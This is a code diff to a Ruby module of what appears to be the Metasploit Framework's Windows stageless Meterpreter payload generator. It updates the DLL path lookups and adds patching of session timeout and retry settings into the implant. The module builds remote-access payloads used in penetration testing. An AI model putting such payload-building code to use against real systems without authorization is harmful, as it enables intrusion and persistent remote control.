@@ -52,7 +52,7 @@ module Payload::Windows::StagelessMeterpreter
   end
 
   def generate_stageless_x86(url = nil)
-    dll, offset = load_rdi_dll(MeterpreterBinaries.path('metsrv', 'x86.dll'))
+    dll, offset = load_rdi_dll(MetasploitPayloads.meterpreter_path('metsrv', 'x86.dll'))
 
     conf = {
       :rdi_offset => offset,
@@ -85,6 +85,16 @@ module Payload::Windows::StagelessMeterpreter
       end
     end
 
+    # Patch in the timeout options
+    timeout_opts = {
+      :expiration   => datastore['SessionExpirationTimeout'].to_i,
+      :comm_timeout => datastore['SessionCommunicationTimeout'].to_i,
+      :retry_total  => datastore['SessionRetryTotal'].to_i,
+      :retry_wait   => datastore['SessionRetryWait'].to_i
+    }
+
+    Rex::Payloads::Meterpreter::Patch.patch_timeouts!(dll, timeout_opts)
+
     # if a block is given then call that with the meterpreter dll
     # so that custom patching can happen if required
     yield dll if block_given?
@@ -94,7 +104,7 @@ module Payload::Windows::StagelessMeterpreter
     unless datastore['EXTENSIONS'].nil?
       datastore['EXTENSIONS'].split(',').each do |e|
         e = e.strip.downcase
-        ext, o = load_rdi_dll(MeterpreterBinaries.path("ext_server_#{e}", 'x86.dll'))
+        ext, o = load_rdi_dll(MetasploitPayloads.meterpreter_path("ext_server_#{e}", 'x86.dll'))
 
         # append the size, offset to RDI and the payload itself
         dll << [ext.length].pack('V') + ext
